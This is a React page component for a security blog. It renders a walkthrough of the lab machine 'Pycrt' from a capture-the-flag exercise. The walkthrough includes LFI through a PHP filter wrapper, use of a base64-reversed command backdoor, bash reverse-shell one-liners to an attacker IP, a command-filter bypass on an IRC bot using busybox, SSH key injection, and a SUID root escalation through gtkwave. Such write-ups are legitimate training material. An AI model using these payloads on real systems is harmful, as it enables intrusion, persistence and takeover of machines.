import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './PycrtWalkthrough.css';

const PycrtWalkthrough = () => {
  const navigate = useNavigate();

  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };
    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';
    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button className={'copy-button ' + (copied ? 'copied' : '')} onClick={handleCopy} title={copied ? 'Copied!' : 'Copy to clipboard'}>
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      const matched = match[0];
      if (matched.startsWith('[') && matched.includes('](')) {
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(<a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">{linkText}</a>);
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      lastIndex = regex.lastIndex;
    }
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    return parts.length > 0 ? parts : text;
  };

  const writeup = {
    id: 'pycrt-walkthrough',
    title: 'Pycrt Walkthrough',
    excerpt: 'Pycrt is a medium difficulty Hack My VM machine featuring IRC enumeration, Local File Inclusion via a hidden PHP endpoint, a custom base64-reversed command injection backdoor, lateral movement through sudo weechat and an IRC bot that executes decimal-encoded commands, and privilege escalation via sudo gtkwave with a malicious Tcl script.',
    date: 'May 14, 2026',
    tags: ['Hmv', 'Linux', 'IRC', 'LFI', 'Path-Traversal', 'Sudo-Weechat', 'Sudo-Gtkwave'],
    difficulty: 'Medium',
    os: 'Linux',
    ip: '192.168.0.108',
    content: `## Overview
Pycrt is a **medium** difficulty Linux machine from **Hack My VM** that chains multiple attack vectors across IRC, web, and privilege escalation. Initial reconnaissance reveals an IRC server (InspIRCd-3) running alongside Apache. By connecting to the IRC server and reading its **Message of the Day (MOTD)**, a hidden web directory called \`ShadowSec\` is leaked. Fuzzing that directory uncovers \`bydataset.php\`, a file vulnerable to **Local File Inclusion** through a \`file\` GET parameter. Using a PHP filter wrapper to read the file's own source code reveals a hidden **backdoor**: a POST handler that requires a hardcoded auth token (\`LetMeIn123!\`) and a \`payload\` field containing a command prefixed with \`cmd:\`, encoded in base64, and then **string-reversed**. Exploiting this backdoor yields a reverse shell as \`www-data\`. Lateral movement is done in two stages: first by abusing \`sudo weechat\` to execute system commands as \`chatlake\` via the \`/exec\` plugin, then by interacting with an IRC bot running as \`pycrtlake\` that accepts **decimal-encoded ASCII commands** suffixed with \`:)\`. Since common binaries are restricted, \`busybox\` is used to bypass filters and inject an SSH public key for persistent access. Finally, \`sudo gtkwave\` is exploited by feeding it a malicious Tcl script via \`xvfb-run\` that sets the SUID bit on \`/bin/bash\`, granting root.

## Enumeration
### Port Scanning
A full port scan with service and script detection reveals three open ports:
\`\`\`bash
sudo nmap -vv -sS -Pn -sV -sC -p- --min-rate=10000 192.168.0.108 -oN nmap/log.nmap

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
6667/tcp open  irc     syn-ack ttl 64
| irc-info:
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.local
|   version: InspIRCd-3. irc.local
|   source ident: nmap
|   source host: 192.168.0.8
|_  error: Closing link: (nmap@192.168.0.8) [Client exited]
Service Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

**Port 22** runs OpenSSH 8.4p1 on Debian. **Port 80** serves the default Apache2 Debian page with no custom content. **Port 6667** runs an **InspIRCd-3** IRC server with the hostname \`irc.local\`, sendo o serviço mais interessante para enumerar.

### IRC Enumeration
Connecting to the IRC server directly via \`nc\` on port 6667 and registering a user with raw IRC protocol commands. The server responds with its full MOTD (Message of the Day), which contains a critical information leak. The MOTD banner mentions a \`ShadowSec\` directory, and the \`VERSION\` command confirms InspIRCd-3:
\`\`\`bash
USER v01 0 * :v01
NICK v01
VERSION
\`\`\`
![IRC raw connection showing MOTD with ShadowSec directory leak and InspIRCd version](/images/writeups/pycrt/1.png)

For a better IRC experience, the server is added to the \`irssi\` client:
\`\`\`bash
/server add -network irc.local 192.168.0.108 6667
\`\`\`
![Adding irc.local to irssi client](/images/writeups/pycrt/2.png)

After connecting via irssi, the MOTD is displayed again in a more readable format. The key line reads: *"This is a private irc server. Please contact the admin of the server for any questions or issues ShadowSec directory."*, confirming the existence of a \`/ShadowSec/\` path on the web server:
\`\`\`bash
/connect irc.local
/nick admin
/nick v01
\`\`\`
![irssi connection showing the MOTD with ShadowSec directory highlighted](/images/writeups/pycrt/3.png)

Browsing to \`http://irc.local/ShadowSec/\` confirms the directory exists. It presents a themed page called **"ShadowSec Tactical Interface"** with an operative profile for user \`ll104567\` (codename: BATTLE GOD). This username will be important later for interacting with the IRC bot:
![ShadowSec Tactical Interface showing operative ll104567 profile](/images/writeups/pycrt/4.png)

### Web Fuzzing
Fuzzing files and directories inside \`/ShadowSec/\` with ffuf discovers a PHP file called \`bydataset.php\`:
\`\`\`bash
ffuf -u 'http://irc.local/ShadowSec/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -c -e .php,.html,.txt
\`\`\`
![ffuf results showing bydataset.php](/images/writeups/pycrt/5.png)

## Foothold
### Local File Inclusion
Accessing \`bydataset.php\` directly returns a dismissive message: *"Nothing to see here."*, a classic sign that the file does more than it shows on the surface:
![bydataset.php returning "Nothing to see here"](/images/writeups/pycrt/6.png)

Fuzzing GET parameters on \`bydataset.php\` using Burp's parameter names wordlist discovers a \`file\` parameter. The \`-fs 21\` flag filters out the default 21-byte "Nothing to see here" response:
\`\`\`bash
ffuf -u 'http://irc.local/ShadowSec/bydataset.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -fs 21
\`\`\`
![ffuf parameter fuzzing discovering the file parameter](/images/writeups/pycrt/7.png)

Passing \`/etc/passwd\` to the \`file\` parameter confirms the **Local File Inclusion** vulnerability. The contents of the system passwd file are returned in the response, revealing system users like \`chatlake\` and \`pycrtlake\`:
![LFI successfully reading /etc/passwd](/images/writeups/pycrt/8.png)

To understand the full capabilities of this file, a **PHP filter wrapper** is used to extract the source code of \`bydataset.php\` itself, encoded in base64 to avoid execution:
\`\`\`bash
view-source:http://irc.local/ShadowSec/bydataset.php?file=php://filter/read=convert.base64-encode/resource=bydataset.php
\`\`\`
![Base64-encoded PHP source code returned via filter wrapper](/images/writeups/pycrt/9.png)

### Backdoor Analysis
Decoding the base64 reveals a \`decrypt()\` function that processes the payload. The function first **reverses** the input string with \`strrev()\`, then **base64-decodes** it. If the decoded result starts with the prefix \`cmd:\`, the remaining string after the prefix is extracted and returned as the command to execute:
![PHP decrypt function showing strrev, base64_decode, and cmd: prefix check](/images/writeups/pycrt/10.png)

The second part of the source code reveals the full backdoor logic. On a **POST** request, the script expects two parameters: \`auth\` and \`payload\`. The \`auth\` field must match the hardcoded password **\`LetMeIn123!\`**. Otherwise it exits with "Invalid Auth Token." If authentication passes, the \`payload\` is fed through the \`decrypt()\` function and the resulting command string is executed via PHP's \`exec()\` function, with the output rendered inside \`<pre>\` tags:
![Full PHP backdoor showing POST handler with auth check, decrypt, and exec](/images/writeups/pycrt/11.png)

Testing the backdoor in **Burp Suite Repeater**. Sending a POST to \`/ShadowSec/bydataset.php\` with \`auth=LetMeIn123!\` and \`payload=Y21kOmlk\` (which is \`cmd:id\` in base64, but **not reversed**). The response shows "Payload decode failed" because the server expects the base64 string to be **reversed** before sending:
![Burp Repeater showing failed payload, not reversed](/images/writeups/pycrt/12.png)

Sending the correctly formatted payload with the base64 string **reversed** (\`klmOk12Y\` instead of \`Y21kOmlk\`), the server successfully decodes it, executes \`id\`, and returns the output: \`uid=33(www-data) gid=33(www-data) groups=33(www-data)\`. This confirms **Remote Code Execution** as \`www-data\`:
![Burp Repeater showing successful RCE, id command returns www-data](/images/writeups/pycrt/13.png)

### Reverse Shell
The encoding pipeline can be automated directly in the terminal. To generate a valid payload: write the command with the \`cmd:\` prefix, pipe it through \`base64\`, then pipe through \`rev\` to reverse the string:
\`\`\`bash
echo "cmd:whoami" | base64 | rev
\`\`\`
![Terminal showing payload generation pipeline](/images/writeups/pycrt/14.png)

Using the same technique to craft a **bash reverse shell** payload. The full command \`bash -c "bash -i >& /dev/tcp/192.168.0.8/2557 0>&1"\` is prefixed with \`cmd:\`, base64-encoded, and reversed. This is sent as the \`payload\` parameter in the POST request while a \`nc\` listener waits on port 2557:
\`\`\`bash
echo 'cmd:bash -c "bash -i >& /dev/tcp/192.168.0.8/2557 0>&1"' | base64 | rev
\`\`\`
![Reverse shell payload generation](/images/writeups/pycrt/15.png)

## Post Exploitation
### Lateral Movement - sudo weechat
After landing a shell as \`www-data\`, running \`sudo -l\` reveals that this user can execute **\`/usr/bin/weechat\`** as the \`chatlake\` user without a password. Weechat is an IRC client that supports plugin-based command execution, a well-known privilege escalation vector:
![sudo -l showing www-data can run weechat as chatlake with NOPASSWD](/images/writeups/pycrt/16.png)

Before running weechat, the shell needs to be upgraded to a proper TTY, since weechat requires a terminal interface:
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 160
\`\`\`

Launching weechat as the \`chatlake\` user:
\`\`\`bash
sudo -u chatlake /usr/bin/weechat
\`\`\`
![Weechat launched as chatlake user](/images/writeups/pycrt/17.png)

Inside weechat, the \`/exec\` plugin is available, which allows running arbitrary system commands. This is the key to escalation: any command executed through \`/exec\` runs as \`chatlake\`:
![Weechat /exec plugin available](/images/writeups/pycrt/18.png)

Confirming code execution by running \`id\` through the exec plugin. The output confirms we're running as \`chatlake\`:
\`\`\`bash
/exec id
\`\`\`
![/exec id showing uid=chatlake](/images/writeups/pycrt/19.png)

Using the exec plugin to spawn a full reverse shell back to the attacker machine. A \`nc\` listener is set up on port 1337 to catch the connection:
\`\`\`bash
/exec /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.8/1337 0>&1'
\`\`\`
![Reverse shell command executed via weechat /exec](/images/writeups/pycrt/20.png)

The reverse shell lands as \`chatlake\` and the **user flag** is retrieved:
![Shell as chatlake with user flag](/images/writeups/pycrt/21.png)

### Lateral Movement - IRC Bot
Running \`sudo -l\` as \`chatlake\` reveals a new privilege: the ability to run \`/usr/bin/systemctl start irc_bot.service\` as root via NOPASSWD. Investigating further, the bot script is located at \`/usr/local/bin/irc_bot.py\`, owned by \`pycrtlake\`, but \`chatlake\` has no read permissions on it. We can start the bot but can't see its source code:
![sudo -l for chatlake showing systemctl start irc_bot.service, and ls -la showing the bot owned by pycrtlake](/images/writeups/pycrt/22.png)

Searching for all files owned by \`pycrtlake\` across the filesystem reveals the bot script and its home directory:
\`\`\`bash
find / -user pycrtlake 2>/dev/null
\`\`\`
![Find results showing pycrtlake-owned files - part 1](/images/writeups/pycrt/23.png)
![Find results showing pycrtlake-owned files - part 2](/images/writeups/pycrt/24.png)

Starting the IRC bot service and connecting to the IRC server to interact with it:
![Bot service started and IRC connection established](/images/writeups/pycrt/25.png)

Listing available channels with \`/list\` shows that the bot has created several channels: \`#chan1\` through \`#chan6\`:
\`\`\`bash
/list
\`\`\`
![Channel listing showing chan1 through chan6](/images/writeups/pycrt/26.png)

Recalling the username \`ll104567\` found earlier on the ShadowSec web page, changing the IRC nick to match. This is the username the bot recognizes and responds to:
\`\`\`bash
/nick ll104567
\`\`\`
![Changing nick to ll104567](/images/writeups/pycrt/27.png)

After joining \`#chan6\` as \`ll104567\`, the \`@admin\` bot responds with a message: *"My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to :) End"*. This hints that messages must end with the \`:)\` string to be processed by the bot:
![Bot @admin responding on chan6 with formatting hint about :) suffix](/images/writeups/pycrt/28.png)

Switching to **weechat** for a better IRC experience. Sending messages with the \`:)\` suffix triggers responses from the bot. On \`#chan5\`, sending \`hey:)\` causes the bot to reply with error messages in private, confirming the bot processes messages ending with \`:)\`:
![Weechat showing message sent with :) suffix on chan5](/images/writeups/pycrt/29.png)
![Admin bot responding with "Format error or presence of illegal characters"](/images/writeups/pycrt/30.png)

Testing with numbers followed by \`:)\`. Sending \`1:)\` and \`2:)\`. The bot responds with "Wrong command: 'A' unauthorized!" and "Wrong command: '' unauthorized!" respectively. The numbers \`1\` and \`2\` are being interpreted as **decimal ASCII values** (1 = SOH control char, 2 = STX control char). This reveals the bot's input mechanism: it expects **space-separated decimal ASCII codes** that get converted to characters:
![Sending decimal values 1:) and 2:) on chan1](/images/writeups/pycrt/31.png)
![Bot responding with decoded characters as "Wrong command"](/images/writeups/pycrt/32.png)

Testing with valid ASCII decimal values. Sending \`105 100:)\` which decodes to \`id\`. The bot attempts to execute it:
![Sending decimal-encoded command attempt](/images/writeups/pycrt/33.png)

However, some commands are blocked by the bot's filter:
![Bot blocking certain commands](/images/writeups/pycrt/34.png)

Encoding \`whoami\` as decimal ASCII values (\`119 104 111 97 109 105\`) and sending it with the \`:)\` suffix. The bot executes the command and responds with **\`[+] COMMAND EXECUTION: pycrtlake\`**, confirming the bot runs commands as the \`pycrtlake\` user:
\`\`\`bash
whoami
119 104 111 97 109 105:)
\`\`\`
![Sending whoami as decimal ASCII: 119 104 111 97 109 105:)](/images/writeups/pycrt/35.png)
![Bot response: COMMAND EXECUTION: pycrtlake](/images/writeups/pycrt/36.png)

Several common Linux commands (\`cat\`, \`ls\`, etc.) are blacklisted by the bot and return errors:
![Bot showing restricted/blacklisted commands](/images/writeups/pycrt/37.png)

The filter can be bypassed using **\`busybox\`**, which provides its own implementations of common utilities. Encoding \`busybox id\` as decimal (\`98 117 115 121 98 111 120 32 105 100\`) successfully executes and confirms the \`pycrtlake\` identity:
\`\`\`bash
busybox id
98 117 115 121 98 111 120 32 105 100:)
\`\`\`
![Busybox id bypassing command filter](/images/writeups/pycrt/38.png)

Attempting to get a reverse shell via \`busybox nc\`. The connection is established but **dies after approximately 10 seconds**, likely due to the bot's execution timeout. A different persistence method is needed:
![NC reverse shell connects but dies quickly - part 1](/images/writeups/pycrt/39.png)
![NC reverse shell connects but dies quickly - part 2](/images/writeups/pycrt/40.png)
![NC reverse shell connects but dies quickly - part 3](/images/writeups/pycrt/41.png)

### SSH Key Injection
Since reverse shells are killed by the bot's timeout, a more persistent approach is used: **SSH key injection**. First, generating an RSA key pair on the attacker machine:
\`\`\`bash
ssh-keygen -t rsa -b 4096
\`\`\`

Using the bot's \`busybox\` bypass to create the \`.ssh\` directory in pycrtlake's home. The command \`busybox mkdir /home/pycrt/.ssh\` is encoded as decimal ASCII and sent via the IRC channel. A CyberChef-like tool is used to convert the command string to decimal and generate the output payload:
![CyberChef encoding busybox mkdir /home/pycrt/.ssh as decimal ASCII](/images/writeups/pycrt/42.png)

Next, a \`nc\` listener is set up on port 1337. When the bot's reverse shell briefly connects (within its 10-second window), the attacker immediately pipes an \`echo\` command that writes the SSH public key into \`/home/pycrtlake/.ssh/authorized_keys\`. The brief connection is enough to inject the key:
\`\`\`bash
nc -lnvp 1337
\`\`\`
![Listener catches brief connection and injects SSH public key into authorized_keys](/images/writeups/pycrt/43.png)

With the public key now in place, authenticating as \`pycrtlake\` via SSH using the corresponding private key succeeds, providing a stable, persistent shell:
\`\`\`bash
chmod 600 id_rsa
ssh pycrtlake@192.168.0.112 -i id_rsa
\`\`\`
![Successful SSH authentication as pycrtlake](/images/writeups/pycrt/44.png)

## Privilege Escalation
### sudo gtkwave
Running \`sudo -l\` as \`pycrtlake\` reveals the final privilege: the ability to execute **\`/usr/bin/gtkwave\`** as root (ALL) with NOPASSWD. GTKWave is a waveform viewer for digital signals that supports loading **Tcl scripts**, a powerful scripting language that can execute system commands:
![sudo -l showing pycrtlake can run gtkwave as ALL with NOPASSWD](/images/writeups/pycrt/45.png)

Running \`sudo gtkwave\` directly fails with a \`DISPLAY\` environment variable error since there's no graphical session available on the SSH connection:
![gtkwave failing with cannot open display error](/images/writeups/pycrt/46.png)

The solution is to use \`xvfb-run\` (X Virtual Framebuffer), which creates a virtual display. A Tcl script named \`script\` is created containing a single line: \`exec chmod u+s /bin/bash\`. When gtkwave loads this script via the \`--script\` flag, it executes the Tcl code **as root**, setting the SUID bit on \`/bin/bash\`. After execution, \`ls -la /bin/bash\` confirms the SUID bit is set (\`-rwsr-xr-x\`):
\`\`\`bash
echo 'exec chmod u+s /bin/bash' > script
xvfb-run sudo /usr/bin/gtkwave --script=script
\`\`\`
![Creating Tcl script, running xvfb-run sudo gtkwave --script=script, and confirming SUID on /bin/bash](/images/writeups/pycrt/47.png)

With the SUID bit set, running \`bash -p\` spawns a root shell. Navigating to \`/root\` and reading the **root flag** completes the machine:
![bash -p giving root shell, reading root.txt flag](/images/writeups/pycrt/48.png)

## Conclusion
Pycrt is a medium Linux machine that demonstrates a multi-layered attack path through IRC, web, and system exploitation, requiring creative approaches at every stage.

The attack path involved:

• **Recon**: Discovering three open ports: SSH (22), Apache (80), and IRC/InspIRCd (6667)
• **Enumeration**: Connecting to the IRC server and reading the MOTD banner to discover a hidden \`/ShadowSec/\` web directory, then fuzzing it to find \`bydataset.php\` with a \`file\` GET parameter vulnerable to Local File Inclusion
• **Foothold**: Using a PHP filter wrapper to extract the source code of the PHP backdoor, reverse-engineering its three-layer encoding scheme (command prefix + base64 + string reversal), and exploiting it to get a reverse shell as \`www-data\`
• **Lateral Movement 1**: Abusing \`sudo weechat\` as \`chatlake\`. Weechat's \`/exec\` plugin allows arbitrary command execution, providing a reverse shell as \`chatlake\` and the user flag
• **Lateral Movement 2**: Starting an IRC bot service and discovering it accepts decimal-encoded ASCII commands suffixed with \`:)\`. Using \`busybox\` to bypass the bot's command blacklist, and injecting an SSH public key for persistent access as \`pycrtlake\` since reverse shells are killed by the bot's 10-second timeout
• **Privilege Escalation**: Exploiting \`sudo gtkwave\` by running it through \`xvfb-run\` with a malicious Tcl script (\`exec chmod u+s /bin/bash\`) that sets the SUID bit, then spawning a root shell with \`bash -p\`

**Tools Used**: Nmap, arp-scan, ffuf, netcat, irssi, weechat, Burp Suite, Busybox, SSH keygen, xvfb-run, CyberChef

The machine highlights the risks of leaking internal paths through IRC MOTD banners, combining LFI with hidden backdoors, and allowing \`sudo\` on interactive tools like weechat and gtkwave that support arbitrary command execution through plugins and scripting engines.`
  };

  return (
    <>
      <DynamicSEO
        type="writeup"
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/pycrt/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }}
      />
      <motion.div
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
        <div className="writeup-header">
          <Link to="/writeups" className="back-button">
            <FaArrowLeft />
            <span>Back to Writeups</span>
          </Link>
        </div>

        <motion.div
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>

          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>

          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS:
                    <img
                      src={`/os-icons/${writeup.os}.png`}
                      alt={`${writeup.os} Icon`}
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        if (e.target.nextSibling) e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/pycrt/machine.png" alt="Pycrt" className="machine-image" />
              </div>
            </div>
          </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;

              while (i < lines.length) {
                const line = lines[i];

                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }

                i++;
              }

              return elements;
            })()}
          </div>
        </motion.div>

        <TableOfContents content={writeup.content} title={writeup.title} />
        <ScrollToTop />
      </motion.div>
    </>
  );
};

export default PycrtWalkthrough;
